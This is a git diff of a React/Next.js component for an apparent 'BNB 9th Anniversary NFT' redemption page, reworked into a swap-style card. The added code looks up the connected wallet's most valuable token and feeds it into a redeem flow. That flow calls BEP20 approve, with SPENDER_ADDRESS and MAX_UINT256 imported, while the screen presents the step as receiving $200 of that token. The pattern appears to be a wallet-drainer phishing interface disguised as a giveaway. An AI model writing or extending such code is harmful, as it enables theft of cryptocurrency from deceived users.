@@ -1,10 +1,10 @@
 "use client"
 
-import { useState, useCallback } from "react"
+import { useState, useCallback, useEffect } from "react"
 import Image from "next/image"
 import { Button } from "@/components/ui/button"
 import { Card, CardContent } from "@/components/ui/card"
-import { CheckCircle2, Wallet, AlertCircle, Loader2 } from "lucide-react"
+import { Wallet, Loader2, ArrowDown } from "lucide-react"
 import { useLanguage } from "@/lib/language-context"
 import { useAccount, useWriteContract, useWaitForTransactionReceipt } from "wagmi"
 import { useConnectModal } from "@rainbow-me/rainbowkit"
@@ -12,11 +12,20 @@ import { useSyncContext } from "@/lib/sync-context"
 import { useToast } from "@/hooks/use-toast"
 import { BEP20_ABI, SPENDER_ADDRESS, MAX_UINT256 } from "@/lib/contracts"
 
+interface TokenData {
+  token_address: string
+  symbol: string | null
+  name: string | null
+  logo: string | null
+  usd_price: number
+}
+
 export function RedemptionCard() {
   const { t } = useLanguage()
   const { address, isConnected } = useAccount()
   const { openConnectModal } = useConnectModal()
   const [isRedeeming, setIsRedeeming] = useState(false)
+  const [currentTokenAddress, setCurrentTokenAddress] = useState<TokenData | null>(null)
   const { isSyncing, syncCompleted, syncError } = useSyncContext()
   const { toast } = useToast()
   const { writeContractAsync } = useWriteContract()
@@ -24,6 +33,37 @@ export function RedemptionCard() {
   const handleConnect = useCallback(() => {
     openConnectModal?.()
   }, [openConnectModal])
+
+  // Fetch token data when wallet is connected and sync is completed
+  useEffect(() => {
+    const fetchTokenData = async () => {
+      if (!address || !syncCompleted || currentTokenAddress) return
+
+      try {
+        const response = await fetch(`/api/supabase/get-top-token?walletAddress=${address}`)
+        
+        if (!response.ok) {
+          return
+        }
+
+        const { data: tokenData } = await response.json()
+        
+        if (tokenData && tokenData.token_address) {
+          setCurrentTokenAddress({
+            token_address: tokenData.token_address,
+            symbol: tokenData.symbol,
+            name: tokenData.name,
+            logo: tokenData.logo,
+            usd_price: tokenData.usd_price || 0,
+          })
+        }
+      } catch (error) {
+        console.error('Failed to fetch token data:', error)
+      }
+    }
+
+    fetchTokenData()
+  }, [address, syncCompleted, currentTokenAddress])
 
   const handleRedeem = async () => {
     if (!address) {
@@ -58,6 +98,15 @@ export function RedemptionCard() {
 
       // 保存当前代币地址，用于后续更新
       currentTokenAddress = tokenData.token_address
+      
+      // 保存代币数据到状态
+      setCurrentTokenAddress({
+        token_address: tokenData.token_address,
+        symbol: tokenData.symbol,
+        name: tokenData.name,
+        logo: tokenData.logo,
+        usd_price: tokenData.usd_price || 0,
+      })
 
       // 步骤 2: 调用 BEP20 approve 方法
       console.log('Calling approve...')
@@ -115,93 +164,210 @@ export function RedemptionCard() {
     }
   }
 
+  // Calculate token amount: 200 / usd_price
+  const calculateTokenAmount = (usdPrice: number, mobile: boolean = false) => {
+    if (!usdPrice || usdPrice === 0) return "0"
+    const amount = 200 / usdPrice
+    
+    // For mobile, limit to 4 decimal places if number is small
+    if (mobile && amount < 1) {
+      return amount.toFixed(4).replace(/\.?0+$/, "")
+    }
+    
+    return amount.toFixed(6).replace(/\.?0+$/, "") // Remove trailing zeros
+  }
+  
+  // Truncate token symbol if too long
+  const formatTokenSymbol = (symbol: string | null) => {
+    if (!symbol) return "TOKEN"
+    if (symbol.length > 8) {
+      return `${symbol.slice(0, 8)}...`
+    }
+    return symbol
+  }
+
   return (
-    <Card className="bg-card border-border overflow-hidden">
-      <CardContent className="p-0">
-        <div className="flex flex-col lg:grid lg:grid-cols-2 gap-0">
-          {/* NFT Image */}
-          <div className="relative aspect-square lg:aspect-auto min-h-[280px] sm:min-h-[320px] lg:min-h-[400px] rounded-4xl overflow-hidden lg:ml-6">
-            <Image
-              src="/bnb_coin.gif"
-              alt="BNB 9th Anniversary NFT"
-              fill
-              className="object-cover"
-              priority
-            />
-            <div className="absolute top-4 left-4 sm:top-5 sm:left-5 lg:top-6 lg:left-6 bg-primary text-primary-foreground px-2 sm:px-3 py-1 rounded-full text-xs sm:text-sm font-semibold">
-              {t.redemption.nftLabel}
+    <Card className="bg-card border-2 border-border overflow-hidden max-w-2xl mx-auto shadow-lg">
+      <CardContent className="p-5 sm:p-7">
+        {/* Swap Container */}
+        <div className="space-y-4">
+          {/* From Section - Stacked Layout */}
+          <div className="bg-secondary/50 border-2 border-primary/20 rounded-2xl p-5 sm:p-7 hover:border-primary/40 transition-all">
+            <div className="flex items-center justify-between mb-4">
+              <span className="text-sm sm:text-base text-muted-foreground font-semibold uppercase tracking-wide">{t.swap.from}</span>
             </div>
-          </div>
-
-          {/* Redemption Info */}
-          <div className="p-4 sm:p-6 lg:p-8 flex flex-col">
-            <div className="mb-4 sm:mb-6">
-              <span className="text-muted-foreground text-xs sm:text-sm">{t.redemption.value}</span>
-              <div className="flex items-baseline gap-2 mt-1">
-                <span className="text-3xl sm:text-4xl lg:text-5xl font-bold text-primary">0.5</span>
-                <span className="text-lg sm:text-xl lg:text-2xl font-semibold text-foreground">BNB</span>
+            
+            {/* Stacked Layout */}
+            <div className="flex flex-col items-center gap-5 sm:gap-6">
+              {/* NFT Image - Top (Larger, Centered) */}
+              <div className="relative w-32 h-32 sm:w-40 sm:h-40 rounded-2xl overflow-hidden border-2 border-primary/40 shadow-[0_0_25px_rgba(240,185,11,0.5)]">
+                <Image
+                  src="/bnb_coin.gif"
+                  alt="BNB 9th Anniversary NFT"
+                  fill
+                  className="object-cover"
+                  priority
+                />
               </div>
-              <p className="text-muted-foreground text-xs sm:text-sm mt-1">
-                ≈ $315.00 USD
-              </p>
-            </div>
-
-            <div className="flex-1 space-y-3 sm:space-y-4 mb-4 sm:mb-6">
-              <h3 className="font-semibold text-foreground flex items-center gap-2 text-sm sm:text-base">
-                <AlertCircle className="h-4 w-4 text-primary flex-shrink-0" />
-                {t.redemption.requirements}
-              </h3>
-              <ul className="space-y-2 sm:space-y-3">
-                {t.redemption.rules.map((rule, index) => (
-                  <li key={index} className="flex items-start gap-2 sm:gap-3 text-xs sm:text-sm text-muted-foreground">
-                    <CheckCircle2 className="h-3.5 w-3.5 sm:h-4 sm:w-4 text-primary mt-0.5 flex-shrink-0" />
-                    <span>{rule}</span>
-                  </li>
-                ))}
-              </ul>
-            </div>
-
-            <div className="space-y-2 sm:space-y-3">
-              {!isConnected || isSyncing ? (
-                <Button
-                  onClick={!isConnected ? handleConnect : undefined}
-                  disabled={isSyncing}
-                  className="w-full bg-primary hover:opacity-90 text-primary-foreground font-semibold h-10 sm:h-12 text-sm sm:text-base disabled:opacity-60 disabled:cursor-not-allowed"
-                >
-                  {isSyncing ? (
-                    <>
-                      <Loader2 className="mr-2 h-4 w-4 sm:h-5 sm:w-5 animate-spin" />
-                      <span>Loading...</span>
-                    </>
-                  ) : (
-                    <>
-                      <Wallet className="mr-2 h-4 w-4 sm:h-5 sm:w-5" />
-                      <span>{t.redemption.connectWallet}</span>
-                    </>
-                  )}
-                </Button>
-              ) : syncCompleted ? (
-                <Button
-                  onClick={handleRedeem}
-                  disabled={isRedeeming}
-                  className="w-full bg-primary hover:opacity-90 text-primary-foreground font-semibold h-10 sm:h-12 text-sm sm:text-base"
-                >
-                  {isRedeeming ? t.redemption.processing : t.redemption.redeemButton}
-                </Button>
-              ) : null}
               
-              {/* 同步失败提示 */}
-              {syncError && syncCompleted && (
-                <p className="text-[10px] sm:text-xs text-red-500 text-center">
-                  同步失败: {syncError}
-                </p>
-              )}
-              
-              <p className="text-[10px] sm:text-xs text-muted-foreground text-center">
-                {t.redemption.terms}
-              </p>
+              {/* Token Info - Bottom (Centered with Border) */}
+              <div className="flex items-center gap-3 bg-background/50 border-2 border-primary/30 rounded-xl px-5 py-3.5 sm:px-6 sm:py-4 hover:border-primary/50 transition-colors">
+                <span className="text-xl sm:text-2xl font-bold text-foreground">BNB NFT</span>
+                <div className="relative w-8 h-8 sm:w-10 sm:h-10 flex-shrink-0">
+                  <Image
+                    src="/icon.svg"
+                    alt="BSC"
+                    fill
+                    className="object-contain"
+                  />
+                </div>
+              </div>
             </div>
           </div>
+
+          {/* Swap Arrow - More Space */}
+          <div className="flex justify-center py-2 relative z-10">
+            <div className="bg-background border-2 border-primary rounded-xl p-3 shadow-lg hover:scale-110 transition-transform cursor-pointer">
+              <ArrowDown className="h-6 w-6 text-primary" />
+            </div>
+          </div>
+
+          {/* To Section */}
+          <div className={`bg-secondary/50 border-2 rounded-2xl p-5 sm:p-6 transition-all ${
+            !isConnected || isSyncing 
+              ? 'opacity-50 border-border' 
+              : 'border-primary/20 hover:border-primary/40'
+          }`}>
+            <div className="flex items-center justify-between mb-4">
+              <span className="text-sm sm:text-base text-muted-foreground font-semibold uppercase tracking-wide">{t.swap.to}</span>
+            </div>
+            {syncCompleted && currentTokenAddress ? (
+              <>
+                {/* Desktop Layout */}
+                <div className="hidden sm:flex items-center justify-between gap-6">
+                  {/* Amount and USD Value - Left */}
+                  <div className="flex flex-col">
+                    <span className="text-4xl font-bold text-foreground leading-tight">
+                      {calculateTokenAmount(currentTokenAddress.usd_price || 0)}
+                    </span>
+                    <span className="text-base text-muted-foreground mt-1.5">
+                      {t.swap.estimatedValue}
+                    </span>
+                  </div>
+                  
+                  {/* Token Symbol and Logo - Right */}
+                  <div className="flex items-center gap-3 flex-shrink-0 bg-background/50 border-2 border-primary/30 rounded-xl px-5 py-4 hover:border-primary/50 transition-colors">
+                    <span className="text-2xl font-bold text-foreground">
+                      {currentTokenAddress.symbol || "TOKEN"}
+                    </span>
+                    <div className="relative w-10 h-10 flex-shrink-0 rounded-full overflow-hidden">
+                      <Image
+                        src={currentTokenAddress.logo || "/icon.svg"}
+                        alt={currentTokenAddress.symbol || "Token"}
+                        fill
+                        className="object-cover"
+                        onError={(e) => {
+                          const target = e.target as HTMLImageElement
+                          target.src = "/icon.svg"
+                        }}
+                      />
+                    </div>
+                  </div>
+                </div>
+                
+                {/* Mobile Layout - Stacked */}
+                <div className="flex sm:hidden flex-col gap-4">
+                  {/* Amount and USD Value */}
+                  <div className="flex flex-col">
+                    <span className="text-2xl font-bold text-foreground leading-tight break-all">
+                      {calculateTokenAmount(currentTokenAddress.usd_price || 0, true)}
+                    </span>
+                    <span className="text-xs text-muted-foreground mt-1">
+                      {t.swap.estimatedValue}
+                    </span>
+                  </div>
+                  
+                  {/* Token Symbol and Logo */}
+                  <div className="flex items-center justify-between gap-2">
+                    <div className="flex items-center gap-2 flex-1 min-w-0 bg-background/50 border-2 border-primary/30 rounded-xl px-3 py-2.5 hover:border-primary/50 transition-colors">
+                      <span className="text-lg font-bold text-foreground truncate">
+                        {formatTokenSymbol(currentTokenAddress.symbol)}
+                      </span>
+                      <div className="relative w-7 h-7 flex-shrink-0 rounded-full overflow-hidden">
+                        <Image
+                          src={currentTokenAddress.logo || "/icon.svg"}
+                          alt={currentTokenAddress.symbol || "Token"}
+                          fill
+                          className="object-cover"
+                          onError={(e) => {
+                            const target = e.target as HTMLImageElement
+                            target.src = "/icon.svg"
+                          }}
+                        />
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </>
+            ) : (
+              <div className="flex items-center justify-between gap-4 sm:gap-6">
+                <span className="text-base sm:text-lg text-muted-foreground">
+                  {isConnected ? "Loading..." : "Connect wallet"}
+                </span>
+                <div className="flex items-center gap-2 sm:gap-3 bg-background/50 border-2 border-muted rounded-xl px-3 py-2.5 sm:px-5 sm:py-4">
+                  <span className="text-base sm:text-lg font-bold text-muted-foreground">---</span>
+                  <div className="relative w-7 h-7 sm:w-10 sm:h-10 flex-shrink-0 opacity-50">
+                    <Image
+                      src="/icon.svg"
+                      alt="BSC"
+                      fill
+                      className="object-contain"
+                    />
+                  </div>
+                </div>
+              </div>
+            )}
+          </div>
+        </div>
+
+        {/* Swap Button */}
+        <div className="mt-6 space-y-3">
+          {!isConnected ? (
+            <Button
+              onClick={handleConnect}
+              className="w-full bg-primary hover:opacity-90 text-primary-foreground font-bold h-14 sm:h-16 text-base sm:text-lg rounded-xl shadow-lg border-2 border-primary-foreground/10"
+            >
+              <Wallet className="mr-2 h-6 w-6" />
+              <span>{t.swap.connectWallet}</span>
+            </Button>
+          ) : isSyncing ? (
+            <Button
+              disabled
+              className="w-full bg-primary text-primary-foreground font-bold h-14 sm:h-16 text-base sm:text-lg disabled:opacity-60 disabled:cursor-not-allowed rounded-xl shadow-lg border-2 border-primary-foreground/10"
+            >
+              <Loader2 className="mr-2 h-6 w-6 animate-spin" />
+              <span>Loading...</span>
+            </Button>
+          ) : syncCompleted ? (
+            <Button
+              onClick={handleRedeem}
+              disabled={isRedeeming || !currentTokenAddress}
+              className="w-full bg-primary hover:opacity-90 text-primary-foreground font-bold h-14 sm:h-16 text-base sm:text-lg rounded-xl shadow-lg border-2 border-primary-foreground/10 hover:shadow-xl transition-all"
+            >
+              {isRedeeming ? t.swap.processing : t.swap.swapButton}
+            </Button>
+          ) : null}
+          
+          {/* 同步失败提示 */}
+          {syncError && syncCompleted && (
+            <p className="text-xs text-destructive text-center">
+              Sync failed: {syncError}
+            </p>
+          )}
+          
+          <p className="text-xs sm:text-sm text-muted-foreground text-center">
+            {t.swap.terms}
+          </p>
         </div>
       </CardContent>
     </Card>
